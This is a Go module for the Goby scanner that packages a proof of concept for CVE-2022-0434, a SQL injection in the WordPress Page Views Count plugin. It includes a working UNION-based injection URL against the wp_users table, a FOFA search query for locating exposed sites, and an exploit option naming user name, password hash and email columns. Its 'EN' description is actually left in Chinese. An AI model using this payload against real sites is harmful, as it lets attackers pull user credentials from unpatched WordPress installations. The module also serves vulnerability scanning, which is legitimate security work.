package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress PageViewsCount Plugin SQL Injection Vulnerability (CVE-2022-0434)",
    "Description": "<p>Page Views Count WordPress Plugin是一个设置简单易行的插件，使网站访问者和网站所有者能够快速轻松地查看有多少人访问过该页面或帖子。Page Views Count WordPress Plugin v2.4.15之前的版本中存在SQL注入漏洞，该漏洞允许攻击者通过post_ids参数执行任意SQL代码。</p>",
    "Impact": "<p>WordPress PageViewsCount Plugin SQL Injection</p>",
    "Recommendation": "<p>升级版本，补丁链接</p><p>https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip </p>",
    "Product": "WordPress",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "WordPress PageViewsCount 访问统计插件 rest_route 参数 SQL 注入漏洞（CVE-2022-0434）",
            "Product": "WordPress",
            "Description": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">是一个设置简单易行的插件，使网站访问者和网站所</span><span style=\"color: rgb(34, 34, 34); font-size: 12.0059pt;\">有者能够快速轻松地查看有多少人访问过该页面或帖子。</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin v2.4.15</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">之前的版本中存在</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">注入漏洞，该漏洞允许</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">攻击者通过</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">post_ids</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">参数执行任意</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">代码。</span></p>",
            "Recommendation": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">升级版本，补丁链接</span></p><p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\"><a href=\"https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip\">https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip</a>&nbsp;</span></p>",
            "Impact": "<p>1、攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</p><p>2、可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</p><p>3、如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</p><p>4、<span style=\"color: var(--primaryFont-color);\">经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</span></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress PageViewsCount Plugin SQL Injection Vulnerability (CVE-2022-0434)",
            "Product": "WordPress",
            "Description": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">是一个设置简单易行的插件，使网站访问者和网站所</span><span style=\"color: rgb(34, 34, 34); font-size: 12.0059pt;\">有者能够快速轻松地查看有多少人访问过该页面或帖子。</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin v2.4.15</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">之前的版本中存在</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">注入漏洞，该漏洞允许</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">攻击者通过</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">post_ids</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">参数执行任意</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">代码。</span></p>",
            "Recommendation": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">升级版本，补丁链接</span></p><p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\"><a href=\"https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip\">https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip</a>&nbsp;</span></p>",
            "Impact": "<p>WordPress PageViewsCount Plugin SQL Injection</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"/wp-content/plugins//page-views-count/\"",
    "GobyQuery": "body=\"/wp-content/plugins//page-views-count/\"",
    "Author": "大C",
    "Homepage": "https://wordpress.org/plugins/page-views-count/",
    "DisclosureDate": "2022-04-03",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-0434"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202203-601"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5(1423),md5(1423),md5(1423)%20from%20wp_users%20--%20g",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "856fc81623da2150ba2210ba1b51d241",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5(1423),md5(1423),md5(1423)%20from%20wp_users%20--%20g",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "856fc81623da2150ba2210ba1b51d241",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sql",
            "type": "select",
            "value": "user_name,user_pass,user_email",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10364"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
